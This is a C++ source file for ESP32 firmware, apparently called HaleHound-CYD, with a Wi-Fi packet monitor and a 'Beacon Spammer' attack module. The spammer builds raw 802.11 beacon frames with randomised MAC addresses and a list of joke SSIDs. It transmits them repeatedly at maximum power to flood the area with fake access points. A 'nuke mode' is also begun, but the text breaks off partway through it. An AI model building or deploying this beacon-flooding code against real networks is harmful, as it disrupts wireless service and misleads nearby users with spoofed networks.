// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD WiFi Attack Modules Implementation
// Packet Monitor & Beacon Spammer - Adapted for CYD Touch Interface
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "wifi_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include "skull_bg.h"
#include "nuke_icon.h"
#include "wardriving.h"
#include "gps_module.h"
#include <Preferences.h>
#include <arduinoFFT.h>

// ═══════════════════════════════════════════════════════════════════════════
// PACKET MONITOR IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace PacketMonitor {

// Configuration
#define MAX_CH 14
#define SNAP_LEN 2324
#define FFT_SAMPLES 256

// FFT Configuration
static const double samplingFrequency = 5000;
static double attenuation = 10;
static unsigned int sampling_period_us;

static double vReal[FFT_SAMPLES];
static double vImag[FFT_SAMPLES];

// ArduinoFFT v2.x object (initialized in setup)
static ArduinoFFT<double> FFT = ArduinoFFT<double>(vReal, vImag, FFT_SAMPLES, samplingFrequency);

// Color palette for FFT display
static byte palette_red[128], palette_green[128], palette_blue[128];

// State variables
static bool initialized = false;
static bool exitRequested = false;
static int currentChannel = 1;
static uint32_t packetCounter = 0;
static uint32_t deauthCounter = 0;
static int rssiSum = 0;
static unsigned int epoch = 0;

static Preferences preferences;

// Promiscuous mode callback
static void IRAM_ATTR wifiPromiscuousCB(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

    // Detect deauth frames
    if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0)) {
        deauthCounter++;
    }

    if (type == WIFI_PKT_MISC) return;
    if (ctrl.sig_len > SNAP_LEN) return;

    packetCounter++;
    rssiSum += ctrl.rssi;
}

// Initialize color palette - HALEHOUND CYBERPUNK (black → purple → blue → pink → white)
static void initPalette() {
    // Stage 1 (0-31): Black → Deep Purple (emerging from darkness)
    for (int i = 0; i < 32; i++) {
        palette_red[i] = (i * 15) / 31;    // 0 → 15
        palette_green[i] = 0;               // Stay dark
        palette_blue[i] = (i * 20) / 31;   // 0 → 20 (purple has more blue)
    }
    // Stage 2 (32-63): Deep Purple → Electric Blue (the glow begins)
    for (int i = 32; i < 64; i++) {
        int t = i - 32;
        palette_red[i] = 15 - (t * 15) / 31;   // 15 → 0 (fade red)
        palette_green[i] = (t * 31) / 31;       // 0 → 31 (cyan glow)
        palette_blue[i] = 20 + (t * 11) / 31;  // 20 → 31 (max blue)
    }
    // Stage 3 (64-95): Electric Blue → Hot Pink (MAXIMUM POP - complementary colors!)
    for (int i = 64; i < 96; i++) {
        int t = i - 64;
        palette_red[i] = (t * 31) / 31;        // 0 → 31 (blast red)
        palette_green[i] = 31 - (t * 31) / 31; // 31 → 0 (kill green)
        palette_blue[i] = 31;                   // Stay max blue
    }
    // Stage 4 (96-127): Hot Pink → White (blowout at peak intensity)
    for (int i = 96; i < 128; i++) {
        int t = i - 96;
        palette_red[i] = 31;                   // Max red
        palette_green[i] = (t * 63) / 31;      // 0 → 63 (add green for white)
        palette_blue[i] = 31;                   // Max blue
    }
}

// Perform FFT sampling and display - DYNAMIC LAYOUT FOR CYD PORTRAIT
static void doSamplingFFT() {
    unsigned long microseconds = micros();

    for (int i = 0; i < FFT_SAMPLES; i++) {
        vReal[i] = packetCounter * 300;
        vImag[i] = 1;
        while (micros() - microseconds < sampling_period_us) {
            // Busy wait
        }
        microseconds += sampling_period_us;
    }

    // Remove DC offset
    double mean = 0;
    for (uint16_t i = 0; i < FFT_SAMPLES; i++) {
        mean += vReal[i];
    }
    mean /= FFT_SAMPLES;
    for (uint16_t i = 0; i < FFT_SAMPLES; i++) {
        vReal[i] -= mean;
    }

    // Perform FFT (ArduinoFFT v2.x API)
    FFT.windowing(FFTWindow::Hamming, FFTDirection::Forward);
    FFT.compute(FFTDirection::Forward);
    FFT.complexToMagnitude();

    // ═══════════════════════════════════════════════════════════════════════
    // DYNAMIC LAYOUT - Scales to any CYD screen size (2.8" or 3.5")
    // ═══════════════════════════════════════════════════════════════════════

    const unsigned int center_x = SCREEN_WIDTH / 2;
    const unsigned int half_width = min((int)(FFT_SAMPLES >> 1), (int)center_x);  // Clamp to screen edge
    const unsigned int icon_bar_bottom = 36;
    const unsigned int area_graph_y = icon_bar_bottom + 2;
    const unsigned int area_graph_height = 50;
    const unsigned int waterfall_y = area_graph_y + area_graph_height + 3;

    int max_k = 0;

    // Scale factor if FFT samples > available width
    float scale = (float)half_width / (float)(FFT_SAMPLES >> 1);

    // ═══════════════════════════════════════════════════════════════════════
    // WATERFALL - Draw at waterfall_y + epoch, mirrored from center
    // ═══════════════════════════════════════════════════════════════════════

    // Right side waterfall
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES >> 1)) fft_idx = (FFT_SAMPLES >> 1) - 1;

        int k = vReal[fft_idx] / attenuation;
        if (k > max_k) max_k = k;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x + j, epoch + waterfall_y, color);
    }

    // Left side waterfall (mirrored)
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES >> 1)) fft_idx = (FFT_SAMPLES >> 1) - 1;

        int k = vReal[fft_idx] / attenuation;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x - j - 1, epoch + waterfall_y, color);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // AREA GRAPH - RIGHT SIDE
    // ═══════════════════════════════════════════════════════════════════════

    static int last_y[256] = {0};  // Max FFT_SAMPLES >> 1

    // Clear right side area graph region
    tft.fillRect(center_x, area_graph_y, half_width, area_graph_height, HALEHOUND_BLACK);

    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES >> 1)) fft_idx = (FFT_SAMPLES >> 1) - 1;

        int k = vReal[fft_idx] / attenuation;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y;
        unsigned int x = center_x + j;

        if (j > 0) {
            tft.fillTriangle(x - 1, area_graph_y + area_graph_height, x, area_graph_y + area_graph_height, x - 1, last_y[j - 1], color);
            tft.fillTriangle(x - 1, last_y[j - 1], x, area_graph_y + area_graph_height, x, current_y, color);
        }
        last_y[j] = current_y;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // AREA GRAPH - LEFT SIDE (mirrored)
    // ═══════════════════════════════════════════════════════════════════════

    // Clear left side area graph region
    tft.fillRect(0, area_graph_y, half_width, area_graph_height, HALEHOUND_BLACK);

    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES >> 1)) fft_idx = (FFT_SAMPLES >> 1) - 1;

        int k = vReal[fft_idx] / attenuation;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        int current_y = area_graph_height - map(k, 0, 127, 0, area_graph_height) + area_graph_y;
        unsigned int x = center_x - j - 1;

        if (j > 0 && x > 0) {
            tft.fillTriangle(x + 1, area_graph_y + area_graph_height, x, area_graph_y + area_graph_height, x + 1, last_y[j - 1], color);
            tft.fillTriangle(x + 1, last_y[j - 1], x, area_graph_y + area_graph_height, x, current_y, color);
        }
        last_y[j] = current_y;
    }

    // Auto-scale attenuation
    double tempAttenuation = max_k / 127.0;
    if (tempAttenuation > attenuation) {
        attenuation = tempAttenuation;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // STATUS INFO BAR - Shows CH and Packet count (x=30-160, doesn't touch icons)
    // ═══════════════════════════════════════════════════════════════════════

    tft.fillRect(30, 20, 130, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);

    tft.setCursor(35, 24);
    tft.print("Ch:");
    tft.print(currentChannel);

    tft.setCursor(80, 24);
    tft.print("Pkt:");
    tft.print(packetCounter);

    delay(10);
}

// Draw UI elements - HALEHOUND EDITION with skull watermark
static void drawUI() {
#define PM_ICON_SIZE 16
#define PM_ICON_NUM 3
    static int iconX[PM_ICON_NUM] = {170, 210, 10};
    static int iconY = 20;

    // Icon area background - full width DARK
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Draw bitmap icons
    tft.drawBitmap(iconX[0], iconY, bitmap_icon_sort_up_plus, PM_ICON_SIZE, PM_ICON_SIZE, HALEHOUND_MAGENTA);   // CH+
    tft.drawBitmap(iconX[1], iconY, bitmap_icon_sort_down_minus, PM_ICON_SIZE, PM_ICON_SIZE, HALEHOUND_MAGENTA); // CH-
    tft.drawBitmap(iconX[2], iconY, bitmap_icon_go_back, PM_ICON_SIZE, PM_ICON_SIZE, HALEHOUND_MAGENTA);        // Back

    // Separator lines
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
    tft.drawLine(0, 90, SCREEN_WIDTH, 90, HALEHOUND_MAGENTA);

    // ═══════════════════════════════════════════════════════════════════════
    // SKULL WATERMARK - Draw behind waterfall area
    // Skull is 211x280, center it horizontally, position below separator
    // ═══════════════════════════════════════════════════════════════════════
    // Skull splatter watermark - full screen
    tft.drawBitmap(0, 0, skull_bg_bitmap, SKULL_BG_WIDTH, SKULL_BG_HEIGHT, 0x0041);  // Dark cyan watermark
}

// Glitch title splash - shown on entry, FFT overwrites it during operation
static void drawHeader() {
    drawGlitchText(55, "PKT MONITOR", &Nosifer_Regular10pt7b);
}

void setup() {
    #if CYD_DEBUG
    Serial.println("[PKTMON] Initializing Packet Monitor...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawUI();
    drawHeader();
    epoch = 0;
    exitRequested = false;

    // Skip hardware init if already done
    if (initialized) return;

    // Initialize FFT parameters
    sampling_period_us = round(1000000 * (1.0 / samplingFrequency));
    initPalette();

    // Load saved channel
    preferences.begin("halehound_pm", false);
    currentChannel = preferences.getUInt("channel", 1);
    preferences.end();

    // Initialize WiFi in promiscuous mode
    nvs_flash_init();
    tcpip_adapter_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Set initial channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCB);
    esp_wifi_set_promiscuous(true);

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[PKTMON] Ready on channel " + String(currentChannel));
    #endif
}

void loop() {
    if (!initialized) return;

    // Update touch buttons
    touchButtonsUpdate();

    // Check back button tap
    if (isBackButtonTapped()) {
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ICON BAR TOUCH HANDLING - Matches original ESP32-DIV icon positions
    // Icons at: CH+ x=170, CH- x=210, Back x=10 (all 16px wide)
    // ═══════════════════════════════════════════════════════════════════════
    static unsigned long lastChannelChange = 0;
    if (millis() - lastChannelChange > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            // Icon bar area (y=20-36)
            if (ty >= 20 && ty <= 36) {
                // Back icon at x=10-26
                if (tx > 10 && tx < 26) {
                    exitRequested = true;
                    lastChannelChange = millis();
                    return;
                }
                // CH+ icon at x=170-186
                else if (tx > 170 && tx < 186) {
                    int newChannel = currentChannel + 1;
                    if (newChannel > MAX_CH) newChannel = 1;
                    setChannel(newChannel);
                    lastChannelChange = millis();
                }
                // CH- icon at x=210-226
                else if (tx > 210 && tx < 226) {
                    int newChannel = currentChannel - 1;
                    if (newChannel < 1) newChannel = MAX_CH;
                    setChannel(newChannel);
                    lastChannelChange = millis();
                }
            }
        }
    }

    // Also handle hardware buttons if available
    if (buttonPressed(BTN_LEFT)) {
        int newChannel = currentChannel - 1;
        if (newChannel < 1) newChannel = MAX_CH;
        setChannel(newChannel);
    }

    if (buttonPressed(BTN_RIGHT)) {
        int newChannel = currentChannel + 1;
        if (newChannel > MAX_CH) newChannel = 1;
        setChannel(newChannel);
    }

    // Run UI updates (icon animation, status bar)
    drawStatusBar();

    // Set channel and run promiscuous mode
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCB);
    esp_wifi_set_promiscuous(true);

    // Perform FFT sampling and display
    doSamplingFFT();

    // Update epoch for waterfall - wraps at available waterfall height
    // Layout: icon_bar_bottom=36, area_graph=38-88, waterfall starts at 91
    const unsigned int waterfall_start = 91;
    const unsigned int waterfall_height = SCREEN_HEIGHT - waterfall_start;
    epoch++;
    if (epoch >= waterfall_height) {
        epoch = 0;
    }

    // Reset counters each cycle
    packetCounter = 0;
    deauthCounter = 0;
    rssiSum = 0;
}

void setChannel(int channel) {
    currentChannel = channel;
    if (currentChannel > MAX_CH || currentChannel < 1) {
        currentChannel = 1;
    }

    // Save to preferences
    preferences.begin("halehound_pm", false);
    preferences.putUInt("channel", currentChannel);
    preferences.end();

    // Apply channel change
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCB);
    esp_wifi_set_promiscuous(true);

    #if CYD_DEBUG
    Serial.println("[PKTMON] Channel: " + String(currentChannel));
    #endif
}

int getChannel() {
    return currentChannel;
}

uint32_t getPacketCount() {
    return packetCounter;
}

uint32_t getDeauthCount() {
    return deauthCounter;
}

void resetCounters() {
    packetCounter = 0;
    deauthCounter = 0;
    rssiSum = 0;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(50);
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[PKTMON] Cleanup complete");
    #endif
}

}  // namespace PacketMonitor


// ═══════════════════════════════════════════════════════════════════════════
// BEACON SPAMMER IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace BeaconSpammer {

// SSID list for spam
static const char* ssidList[] = {
    "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
    "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
    "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
    "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
    "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
    "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
    "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
    "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
    "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
    "Meme_LANd", "HaleHound_Was_Here", "Fenrir_Network", "DRAUGR_AP"
};
static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

// ═══════════════════════════════════════════════════════════════════════════
// MATRIX RAIN EFFECT - SSIDs falling like The Matrix
// ═══════════════════════════════════════════════════════════════════════════
#define RAIN_COLUMNS 20
#define RAIN_AREA_TOP 70
#define RAIN_AREA_BOTTOM 310
#define CHAR_HEIGHT 10
#define TRAIL_LENGTH 12

// Rain drop structure
struct RainDrop {
    int x;              // X position
    int y;              // Y position of head
    int speed;          // Fall speed (pixels per frame)
    int ssidIdx;        // Which SSID
    int charIdx;        // Current char in SSID
    char trail[TRAIL_LENGTH + 1];  // Trail of characters
};

static RainDrop rainDrops[RAIN_COLUMNS];
static uint32_t beaconCount = 0;
static unsigned long lastRainUpdate = 0;

// Color palette for trail fade - BLOOD RAIN (pure red gradient)
static const uint16_t trailColors[] = {
    0xF800,           // 0: Bright red (head)
    0xE000,           // 1:
    0xC800,           // 2:
    0xB000,           // 3:
    0x9800,           // 4:
    0x8000,           // 5:
    0x6800,           // 6:
    0x5000,           // 7:
    0x3800,           // 8:
    0x2000,           // 9:
    0x1000,           // 10:
    0x0000            // 11: Black (erase)
};

// Initialize a single rain drop
static void initRainDrop(int idx) {
    rainDrops[idx].x = 3 + (idx * 12);  // Spread across screen (20 columns)
    rainDrops[idx].y = RAIN_AREA_TOP - random(50, 150);  // Start above screen
    rainDrops[idx].speed = random(2, 5);
    rainDrops[idx].ssidIdx = random(ssidCount);
    rainDrops[idx].charIdx = 0;
    memset(rainDrops[idx].trail, 0, sizeof(rainDrops[idx].trail));
}

// Initialize all rain drops
static void initMatrixRain() {
    for (int i = 0; i < RAIN_COLUMNS; i++) {
        initRainDrop(i);
        rainDrops[i].y = RAIN_AREA_TOP + random(0, RAIN_AREA_BOTTOM - RAIN_AREA_TOP);  // Stagger start
    }
}

// Update and draw a single rain drop
static void updateRainDrop(int idx) {
    RainDrop* drop = &rainDrops[idx];
    const char* ssid = ssidList[drop->ssidIdx];
    int ssidLen = strlen(ssid);

    // Move trail down (shift characters)
    for (int i = TRAIL_LENGTH - 1; i > 0; i--) {
        drop->trail[i] = drop->trail[i - 1];
    }

    // Add new character at head
    drop->trail[0] = ssid[drop->charIdx];
    drop->charIdx = (drop->charIdx + 1) % ssidLen;

    // Move drop down
    drop->y += drop->speed;

    // Draw trail (only in visible area)
    tft.setTextSize(1);
    for (int i = 0; i < TRAIL_LENGTH; i++) {
        int charY = drop->y - (i * CHAR_HEIGHT);

        // Only draw if in visible rain area
        if (charY >= RAIN_AREA_TOP && charY < RAIN_AREA_BOTTOM && drop->trail[i] != 0) {
            // Erase previous character position
            tft.fillRect(drop->x, charY, 6, CHAR_HEIGHT, HALEHOUND_BLACK);

            // Draw character with trail color
            tft.setTextColor(trailColors[i]);
            tft.setCursor(drop->x, charY);
            tft.print(drop->trail[i]);
        }
    }

    // Erase character that fell off the trail
    int eraseY = drop->y - (TRAIL_LENGTH * CHAR_HEIGHT);
    if (eraseY >= RAIN_AREA_TOP && eraseY < RAIN_AREA_BOTTOM) {
        tft.fillRect(drop->x, eraseY, 6, CHAR_HEIGHT, HALEHOUND_BLACK);
    }

    // Reset if head is below screen
    if (drop->y > RAIN_AREA_BOTTOM + (TRAIL_LENGTH * CHAR_HEIGHT)) {
        initRainDrop(idx);
        drop->y = RAIN_AREA_TOP - random(20, 80);
    }
}

// Update all matrix rain
static void updateMatrixRain() {
    for (int i = 0; i < RAIN_COLUMNS; i++) {
        updateRainDrop(i);
    }
}

// Beacon frame template
static uint8_t packet[128] = {
    0x80, 0x00, 0x00, 0x00,                         // Frame control + duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination (broadcast)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source (random)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // BSSID (random)
    0xc0, 0x6c,                                     // Sequence/fragment
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                                     // Beacon interval
    0x01, 0x04,                                     // Capability info
    0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, // SSID element
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported rates
    0x03, 0x01, 0x04                                // DS Parameter set (channel)
};

// State variables
static bool initialized = false;
static bool spamming = false;
static bool exitRequested = false;
static int currentChannel = 1;

// Current SSID being broadcast (for display)
static char currentSSID[33] = "";

// Send a single beacon with random SSID
static void sendBeacon() {
    // Randomize MAC addresses (source and BSSID)
    for (int i = 10; i <= 21; i++) {
        packet[i] = random(256);
    }

    // Select random SSID from list
    int idx = random(ssidCount);
    const char* ssid = ssidList[idx];
    int ssidLength = strlen(ssid);
    if (ssidLength > 32) ssidLength = 32;

    // Store for display
    strncpy(currentSSID, ssid, 32);
    currentSSID[32] = '\0';

    // Update SSID in packet
    packet[37] = ssidLength;
    for (int i = 0; i < ssidLength; i++) {
        packet[38 + i] = ssid[i];
    }

    // Update supported rates position (right after SSID)
    int ratesOffset = 38 + ssidLength;
    packet[ratesOffset] = 0x01;      // Supported Rates tag
    packet[ratesOffset + 1] = 0x08;  // Length = 8
    packet[ratesOffset + 2] = 0x82;  // 1 Mbps (basic)
    packet[ratesOffset + 3] = 0x84;  // 2 Mbps (basic)
    packet[ratesOffset + 4] = 0x8b;  // 5.5 Mbps (basic)
    packet[ratesOffset + 5] = 0x96;  // 11 Mbps (basic)
    packet[ratesOffset + 6] = 0x24;  // 18 Mbps
    packet[ratesOffset + 7] = 0x30;  // 24 Mbps
    packet[ratesOffset + 8] = 0x48;  // 36 Mbps
    packet[ratesOffset + 9] = 0x6c;  // 54 Mbps

    // Update DS Parameter Set (channel)
    int dsOffset = ratesOffset + 10;
    packet[dsOffset] = 0x03;         // DS Parameter Set tag
    packet[dsOffset + 1] = 0x01;     // Length = 1
    packet[dsOffset + 2] = currentChannel;

    // Calculate packet size
    int packetSize = dsOffset + 3;

    // Send 3x for reliability (like Nuke mode which works)
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
}

// Glitch title
static void drawHeader() {
    drawGlitchText(55, "BEACON SPAM", &Nosifer_Regular10pt7b);
}

// Draw status header area (below glitch title)
static void drawStatusHeader() {
    // Clear status area
    tft.fillRect(0, 58, SCREEN_WIDTH, 10, HALEHOUND_BLACK);

    // Channel display
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 60);
    tft.print("CH:");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(currentChannel);

    // Status
    tft.setCursor(60, 60);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print("STATUS:");
    if (spamming) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.print("ACTIVE");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("IDLE");
    }

    // Beacon counter
    tft.setCursor(160, 60);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print("TX:");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(beaconCount);

    // Separator line
    tft.drawLine(0, 68, SCREEN_WIDTH, 68, HALEHOUND_VIOLET);
}

// Draw UI - HaleHound Matrix Edition
static void drawUI() {
#define BS_ICON_SIZE 16
#define BS_ICON_NUM 5
    static int iconX[BS_ICON_NUM] = {130, 160, 190, 220, 10};
    static int iconY = 20;

    // Icon bar background
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Draw bitmap icons
    tft.drawBitmap(iconX[4], iconY, bitmap_icon_go_back, BS_ICON_SIZE, BS_ICON_SIZE, HALEHOUND_MAGENTA);          // Back
    tft.drawBitmap(iconX[0], iconY, bitmap_icon_sort_down_minus, BS_ICON_SIZE, BS_ICON_SIZE, HALEHOUND_MAGENTA);  // CH-
    tft.drawBitmap(iconX[1], iconY, bitmap_icon_sort_up_plus, BS_ICON_SIZE, BS_ICON_SIZE, HALEHOUND_MAGENTA);     // CH+
    tft.drawBitmap(iconX[2], iconY, bitmap_icon_start, BS_ICON_SIZE, BS_ICON_SIZE,
                   spamming ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);  // Start (highlight when active)
    tft.drawBitmap(iconX[3], iconY, bitmap_icon_nuke, BS_ICON_SIZE, BS_ICON_SIZE, HALEHOUND_MAGENTA);             // Nuke

    // Separator line
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);

    // Glitch title + status header
    drawHeader();
    drawStatusHeader();
}

void setup() {
    #if CYD_DEBUG
    Serial.println("[BEACON] Initializing Beacon Spammer...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawUI();
    spamming = false;
    exitRequested = false;
    beaconCount = 0;

    // Initialize Matrix rain
    initMatrixRain();

    // Skip hardware init if already done
    if (initialized) return;

    // Safe teardown of any stale WiFi state before reinit
    // Prevents ESP_ERR_NO_MEM (257) crash from double esp_wifi_init()
    WiFi.mode(WIFI_OFF);
    delay(50);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);

    // Initialize WiFi in AP mode for TX
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_max_tx_power(82);       // Max TX power: 20.5 dBm
    esp_wifi_set_ps(WIFI_PS_NONE);       // Disable power saving for max throughput
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BEACON] Ready on channel " + String(currentChannel));
    #endif
}

void loop() {
    if (!initialized) return;

    // Update touch buttons
    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // ICON BAR TOUCH HANDLING - With proper release detection
    // Icons at: CH- x=130, CH+ x=160, Start x=190, Nuke x=220, Back x=10
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area (y=20-36)
        if (ty >= 20 && ty <= 40) {
            // Wait for touch release to prevent repeated triggers
            while (isTouched()) { delay(10); }

            // Back icon at x=10-26
            if (tx >= 5 && tx <= 30) {
                exitRequested = true;
                return;
            }
            // CH- icon at x=130-146
            else if (tx >= 125 && tx <= 150) {
                currentChannel = (currentChannel == 1) ? 14 : currentChannel - 1;
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                drawStatusHeader();
            }
            // CH+ icon at x=160-176
            else if (tx >= 155 && tx <= 180) {
                currentChannel = (currentChannel == 14) ? 1 : currentChannel + 1;
                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
                drawStatusHeader();
            }
            // Start icon at x=190-206
            else if (tx >= 185 && tx <= 210) {
                toggle();
                if (spamming) {
                    // Clear rain area and reinit
                    tft.fillRect(0, RAIN_AREA_TOP, SCREEN_WIDTH, RAIN_AREA_BOTTOM - RAIN_AREA_TOP, HALEHOUND_BLACK);
                    initMatrixRain();
                }
                drawUI();
            }
            // Nuke icon at right edge
            else if (tx >= (tft.width() - 25) && tx <= tft.width()) {
                nukeMode();
                // Restore screen after nuke
                tft.fillScreen(HALEHOUND_BLACK);
                drawStatusBar();
                drawUI();
                initMatrixRain();
            }
        }
    }

    // Also handle hardware BOOT button for back
    if (buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // MATRIX RAIN ANIMATION - Only when spamming
    // ═══════════════════════════════════════════════════════════════════════
    if (spamming) {
        // Send beacons
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        sendBeacon();
        beaconCount++;

        // Update matrix rain animation (throttled for smooth display)
        if (millis() - lastRainUpdate > 30) {  // ~33fps
            updateMatrixRain();
            lastRainUpdate = millis();

            // Update beacon counter every 50 beacons
            if (beaconCount % 50 == 0) {
                drawStatusHeader();
            }
        }
    }
}

void start() {
    spamming = true;
    #if CYD_DEBUG
    Serial.println("[BEACON] Spam STARTED");
    #endif
}

void stop() {
    spamming = false;
    #if CYD_DEBUG
    Serial.println("[BEACON] Spam STOPPED");
    #endif
}

void toggle() {
    spamming = !spamming;
    #if CYD_DEBUG
    Serial.println("[BEACON] Spam " + String(spamming ? "STARTED" : "STOPPED"));
    #endif
}

bool isSpamming() {
    return spamming;
}

void setChannel(int channel) {
    currentChannel = channel;
    if (currentChannel < 1) currentChannel = 1;
    if (currentChannel > 14) currentChannel = 14;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

int getChannel() {
    return currentChannel;
}

void nukeMode() {
    #if CYD_DEBUG
    Serial.println("[BEACON] NUKE MODE ACTIVATED");
    #endif

    // Clear screen and show NUKE header
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Mushroom cloud watermark — dark red, 200x200 fills the screen
    int nukeX = (SCREEN_WIDTH - NUKE_CLOUD_XL_WIDTH) / 2;
    int nukeY = (SCREEN_HEIGHT - NUKE_CLOUD_XL_HEIGHT) / 2 - 10;
    tft.drawBitmap(nukeX, nukeY, bitmap_nuke_cloud_xl, NUKE_CLOUD_XL_WIDTH, NUKE_CLOUD_XL_HEIGHT, 0x5000);

